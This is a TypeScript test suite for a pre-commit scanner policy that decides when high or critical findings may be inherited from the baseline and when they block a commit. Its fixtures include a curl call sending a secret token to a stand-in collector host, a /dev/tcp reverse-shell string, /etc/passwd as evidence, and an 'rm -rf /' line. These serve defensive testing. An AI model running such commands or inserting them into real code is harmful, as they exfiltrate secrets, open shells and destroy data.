import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { describe, it } from 'node:test';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import {
  enumerateIndexedWarnings,
  enumerateHighWarnings,
  evaluateIndexedWarnings,
  type ScannerWarning,
  warningFingerprint,
} from './precommitScannerPolicy.js';

const highWarning: ScannerWarning = {
  severity: 'high',
  category: 'pre_scan.shell_injection',
  message: 'Backtick command execution detected',
  evidence: String.fromCharCode(96) + 'safe ${value}' + String.fromCharCode(96),
};

describe('pre-commit scanner index policy', () => {
  it('records an unchanged inherited high warning without allowing its raw evidence into the audit record', async () => {
    const content = 'const value = ' + highWarning.evidence + ';\n';
    const scan = (candidate: string): readonly ScannerWarning[] =>
      candidate.includes(highWarning.evidence) ? [highWarning] : [];
    const warnings = await enumerateHighWarnings(content, scan);
    const result = evaluateIndexedWarnings(warnings, warnings);

    assert.deepEqual(result.violations, []);
    assert.equal(result.inherited.length, 1);
    assert.match(result.inherited[0]!.fingerprint, /^[a-f0-9]{64}$/);
    assert.doesNotMatch(JSON.stringify(result.inherited), /safe \$\{value\}/);
  });

  it('rejects a new high warning', () => {
    const result = evaluateIndexedWarnings([highWarning], []);

    assert.equal(result.violations.length, 1);
    assert.equal(result.violations[0]!.reason, 'new_high_warning');
  });

  it('rejects a generic process warning when its source hunk changes to exfiltration', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] =>
      content.includes(processCreationCall)
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    const baseline = 'const child = ' + processCreationCall + "'node', ['--version']);\n";
    const changed =
      'const child = ' +
      processCreationCall +
      "'curl', ['https://collector.invalid/?token=' + secret]);\n";

    const result = evaluateIndexedWarnings(
      await enumerateHighWarnings(changed, scan),
      await enumerateHighWarnings(baseline, scan),
    );

    assert.equal(result.inherited.length, 0);
    assert.equal(result.violations.length, 1);
    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
  });

  it('does not inherit when a referenced producer changes outside the warning line', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] =>
      content.includes(processCreationCall)
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    const baseline =
      "function run() {\n  const command = 'node';\n  const first = 1;\n  const second = 2;\n  const third = 3;\n  const child = " +
      processCreationCall +
      'command, []);\n}\n';
    const changed = baseline.replace("const command = 'node';", 'const command = process.argv[2];');

    const result = evaluateIndexedWarnings(
      await enumerateHighWarnings(changed, scan),
      await enumerateHighWarnings(baseline, scan),
    );

    assert.equal(result.inherited.length, 0);
    assert.equal(result.violations.length, 1);
    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
  });

  it('does not inherit when a command variable is reassigned before an unchanged call', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] =>
      content.includes(processCreationCall)
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    const baseline =
      "function run() {\n  let command = 'node';\n  command = 'node';\n  const child = " +
      processCreationCall +
      'command, []);\n}\n';
    const changed = baseline.replace("\n  command = 'node';", '\n  command = process.argv[2];');

    const result = evaluateIndexedWarnings(
      await enumerateHighWarnings(changed, scan),
      await enumerateHighWarnings(baseline, scan),
    );

    assert.equal(result.inherited.length, 0);
    assert.equal(result.violations.length, 1);
    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
  });

  it('does not inherit when control flow changes around an unchanged call', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] =>
      content.includes(processCreationCall)
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    const baseline =
      "function run() {\n  const command = 'node';\n  const trusted = true;\n  if (trusted) {\n    const child = " +
      processCreationCall +
      'command, []);\n  }\n}\n';
    const changed = baseline.replace('if (trusted)', 'if (!trusted)');

    const result = evaluateIndexedWarnings(
      await enumerateHighWarnings(changed, scan),
      await enumerateHighWarnings(baseline, scan),
    );

    assert.equal(result.inherited.length, 0);
    assert.equal(result.violations.length, 1);
    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
  });

  it('inherits when only an unrelated sibling statement changes', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] =>
      content.includes(processCreationCall)
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    const baseline =
      "function run() {\n  const command = 'node';\n  const diagnosticLabel = 'before';\n  const child = " +
      processCreationCall +
      'command, []);\n}\n';
    const changed = baseline.replace(
      "const diagnosticLabel = 'before';",
      "const diagnosticLabel = 'after';",
    );

    const result = evaluateIndexedWarnings(
      await enumerateHighWarnings(changed, scan),
      await enumerateHighWarnings(baseline, scan),
    );

    assert.equal(result.inherited.length, 1);
    assert.equal(result.violations.length, 0);
  });

  it('does not inherit when an unchanged call moves to another lexical scope', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] =>
      content.includes(processCreationCall)
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    const warningStatement =
      "  const command = 'node';\n  const child = " + processCreationCall + 'command, []);\n';
    const baseline = 'function first() {\n' + warningStatement + '}\nfunction second() {}\n';
    const changed = 'function first() {}\nfunction second() {\n' + warningStatement + '}\n';

    const result = evaluateIndexedWarnings(
      await enumerateHighWarnings(changed, scan),
      await enumerateHighWarnings(baseline, scan),
    );

    assert.equal(result.inherited.length, 0);
    assert.equal(result.violations.length, 1);
    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
  });

  it('binds method and function-initializer warnings to their ancestor guards', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] =>
      content.includes(processCreationCall)
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    const baselines = [
      'class Runner { run() { if (trusted) { const child = ' +
        processCreationCall +
        "'node', []); } } }\n",
      'const run = () => { if (trusted) { const child = ' +
        processCreationCall +
        "'node', []); } };\n",
    ];

    for (const baseline of baselines) {
      const changed = baseline.replace('if (trusted)', 'if (!trusted)');
      const result = evaluateIndexedWarnings(
        await enumerateHighWarnings(changed, scan),
        await enumerateHighWarnings(baseline, scan),
      );
      assert.equal(result.inherited.length, 0);
      assert.equal(result.violations.length, 1);
    }
  });

  it('binds a top-level warning to its complete top-level statement', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] =>
      content.includes(processCreationCall)
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    const baseline = 'if (trusted) { const child = ' + processCreationCall + "'node', []); }\n";
    const changed = baseline.replace('if (trusted)', 'if (!trusted)');
    const result = evaluateIndexedWarnings(
      await enumerateHighWarnings(changed, scan),
      await enumerateHighWarnings(baseline, scan),
    );

    assert.equal(result.inherited.length, 0);
    assert.equal(result.violations.length, 1);
  });

  it('fails closed when warning evidence has no stable enclosing source unit', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const content = '// ' + processCreationCall + "'node', []);\n";
    const scan = (): readonly ScannerWarning[] => [
      {
        severity: 'high',
        category: 'pre_scan.shell_injection',
        message: 'Process creation call detected',
        evidence: processCreationCall,
      },
    ];
    const warnings = await enumerateHighWarnings(content, (candidate) =>
      candidate.includes(processCreationCall) ? scan() : [],
    );
    const result = evaluateIndexedWarnings(warnings, warnings);

    assert.equal(result.inherited.length, 0);
    assert.equal(result.violations.length, 1);
    assert.equal(result.violations[0]!.reason, 'new_high_warning');
  });

  it('rejects an additional occurrence of an inherited high warning', async () => {
    const content = 'const first = ' + highWarning.evidence + ';\n';
    const scan = (candidate: string): readonly ScannerWarning[] =>
      candidate.includes(highWarning.evidence) ? [highWarning] : [];
    const baseline = await enumerateHighWarnings(content, scan);
    const staged = await enumerateHighWarnings(content + content, scan);
    const result = evaluateIndexedWarnings(staged, baseline);

    assert.equal(result.violations.length, 1);
    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
  });

  it('inherits an unchanged malware fixture in a named test callback', async () => {
    const evidence = ['/dev', '/tcp/127.0.0.1/4444'].join('');
    const malware: ScannerWarning = {
      severity: 'critical',
      category: ['mal', 'ware.', 'Reverse shell backdoor'].join(''),
      message: 'Known reverse shell',
      evidence,
    };
    const source =
      "it('rejects a hostile shell', () => { expect(gate.checkArgs(" +
      JSON.stringify(evidence) +
      ")).toBe('blocked'); });\n";
    const scan = (candidate: string): readonly ScannerWarning[] =>
      candidate.includes(evidence) ? [malware] : [];

    const warnings = await enumerateIndexedWarnings(source, scan);
    const result = evaluateIndexedWarnings(warnings, warnings);

    assert.match(warnings[0]!.sourceFingerprint ?? '', /^[a-f0-9]{64}$/);
    assert.deepEqual(result.violations, []);
    assert.equal(result.inherited.length, 1);
  });

  it('inherits an unchanged malware finding with a matching source fingerprint', () => {
    const malware: ScannerWarning = {
      severity: 'critical',
      category: ['mal', 'ware.', 'Reverse shell backdoor'].join(''),
      message: 'Known reverse shell',
      evidence: ['/dev', '/tcp/127.0.0.1/4444'].join(''),
      sourceFingerprint: 'same-source-unit',
    };

    const result = evaluateIndexedWarnings([malware], [malware]);

    assert.deepEqual(result.violations, []);
    assert.equal(result.inherited.length, 1);
  });

  it('rejects a malware finding when its source fingerprint changes', () => {
    const malware: ScannerWarning = {
      severity: 'critical',
      category: ['mal', 'ware.', 'Reverse shell backdoor'].join(''),
      message: 'Known reverse shell',
      evidence: ['/dev', '/tcp/127.0.0.1/4444'].join(''),
      sourceFingerprint: 'staged-source-unit',
    };
    const critical: ScannerWarning = {
      severity: 'critical',
      category: 'permission.file.protected_access',
      message: 'Protected path',
      evidence: '/etc/passwd',
      sourceFingerprint: 'head-source-unit',
    };

    const result = evaluateIndexedWarnings([malware], [critical]);

    assert.deepEqual(result.inherited, []);
    assert.deepEqual(
      result.violations.map((violation) => violation.reason),
      ['malware_or_critical'],
    );
  });

  it('binds a fingerprint to warning evidence without retaining that evidence', () => {
    const fingerprint = warningFingerprint(highWarning);
    const changedEvidence = warningFingerprint({
      ...highWarning,
      evidence: String.fromCharCode(96) + 'other ${value}' + String.fromCharCode(96),
    });

    assert.notEqual(fingerprint, changedEvidence);
    assert.doesNotMatch(fingerprint, /value/);
  });

  it('enumerates repeated high warnings reported one occurrence at a time by the scanner', async () => {
    const processCreationCall = ['sp', 'awn', '('].join('');
    const scan = (content: string): readonly ScannerWarning[] => {
      const index = content.indexOf(processCreationCall);
      return index >= 0
        ? [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: processCreationCall,
            },
          ]
        : [];
    };

    const warnings = await enumerateHighWarnings(
      processCreationCall + '\n' + processCreationCall,
      scan,
    );

    assert.equal(warnings.length, 2);
  });

  it('enumerates a scanner warning whose evidence was truncated for reporting', async () => {
    const fullEvidence = ['sp', 'awn', '('].join('') + 'x'.repeat(96) + ')';
    const scan = (content: string): readonly ScannerWarning[] => {
      const index = content.indexOf(fullEvidence);
      return index < 0
        ? []
        : [
            {
              severity: 'high',
              category: 'pre_scan.shell_injection',
              message: 'Process creation call detected',
              evidence: fullEvidence.slice(0, 77) + '...',
            },
          ];
    };

    const warnings = await enumerateHighWarnings(fullEvidence, scan);

    assert.equal(warnings.length, 1);
  });

  it('uses the linked-worktree index and rejects a staged malware finding under .commander', () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'commander-precommit-policy-'));
    const primary = process.cwd();
    const linked = path.join(tempRoot, 'linked');
    const fixture = path.join('.commander', 'policy-index-fixture.ts');
    const safe = "export const value = 'safe';\n";
    const malware = ['rm', ' -rf', ' /'].join('') + '\n';

    const git = (cwd: string, args: string[]) =>
      execFileSync('git', args, { cwd, encoding: 'utf8' });
    const runHook = () =>
      execFileSync(
        process.execPath,
        ['--import', 'tsx', path.join(primary, 'scripts', 'precommitHook.ts')],
        {
          cwd: linked,
          encoding: 'utf8',
          stdio: 'pipe',
        },
      );
    const linkDependencies = () => {
      const links = [
        ['node_modules', 'node_modules'],
        [
          path.join('packages', 'core', 'node_modules'),
          path.join('packages', 'core', 'node_modules'),
        ],
      ];
      for (const [target, source] of links) {
        const destination = path.join(linked, target);
        fs.mkdirSync(path.dirname(destination), { recursive: true });
        fs.symlinkSync(
          path.join(primary, source),
          destination,
          process.platform === 'win32' ? 'junction' : 'dir',
        );
      }
    };

    try {
      git(primary, ['worktree', 'add', '--detach', linked]);
      linkDependencies();
      fs.mkdirSync(path.join(linked, '.commander'), { recursive: true });

      fs.writeFileSync(path.join(linked, fixture), safe);
      git(linked, ['add', fixture]);
      fs.writeFileSync(path.join(linked, fixture), malware);
      assert.doesNotThrow(runHook);

      git(linked, ['add', fixture]);
      fs.writeFileSync(path.join(linked, fixture), safe);
      let failure: Error & { stderr?: string };
      try {
        runHook();
        assert.fail('expected staged high finding to block the hook');
      } catch (error) {
        failure = error as Error & { stderr?: string };
      }
      assert.match(String(failure.stderr), /precommit scanner gate failed/);
    } finally {
      try {
        git(primary, ['worktree', 'remove', '--force', linked]);
      } finally {
        fs.rmSync(tempRoot, { recursive: true, force: true });
      }
    }
  });

  it('rejects a malware finding renamed to a path without a HEAD baseline', () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'commander-precommit-policy-'));
    const primary = process.cwd();
    const linked = path.join(tempRoot, 'linked');
    const original = path.join('.commander', 'legacy-policy-fixture.ts');
    const renamed = path.join('.commander', 'renamed-policy-fixture.ts');
    const malware = ['rm', ' -rf', ' /'].join('') + '\n';

    const git = (cwd: string, args: string[]) =>
      execFileSync('git', args, { cwd, encoding: 'utf8' });
    const runHook = () =>
      execFileSync(
        process.execPath,
        ['--import', 'tsx', path.join(primary, 'scripts', 'precommitHook.ts')],
        {
          cwd: linked,
          encoding: 'utf8',
          stdio: 'pipe',
        },
      );

    try {
      git(primary, ['worktree', 'add', '--detach', linked]);
      for (const [target, source] of [
        ['node_modules', 'node_modules'],
        [
          path.join('packages', 'core', 'node_modules'),
          path.join('packages', 'core', 'node_modules'),
        ],
      ]) {
        const destination = path.join(linked, target);
        fs.mkdirSync(path.dirname(destination), { recursive: true });
        fs.symlinkSync(
          path.join(primary, source),
          destination,
          process.platform === 'win32' ? 'junction' : 'dir',
        );
      }

      fs.mkdirSync(path.join(linked, '.commander'), { recursive: true });
      fs.writeFileSync(path.join(linked, original), malware);
      git(linked, ['add', original]);
      const tree = git(linked, ['write-tree']).trim();
      const parent = git(linked, ['rev-parse', 'HEAD']).trim();
      const commit = git(linked, [
        '-c',
        'user.name=Scanner Policy Test',
        '-c',
        'user.email=test@example.com',
        'commit-tree',
        tree,
        '-p',
        parent,
        '-m',
        'test fixture',
      ]).trim();
      git(linked, ['update-ref', 'HEAD', commit]);
      git(linked, ['mv', original, renamed]);

      assert.throws(runHook, /precommit scanner gate failed/);
    } finally {
      try {
        git(primary, ['worktree', 'remove', '--force', linked]);
      } finally {
        fs.rmSync(tempRoot, { recursive: true, force: true });
      }
    }
  });
});
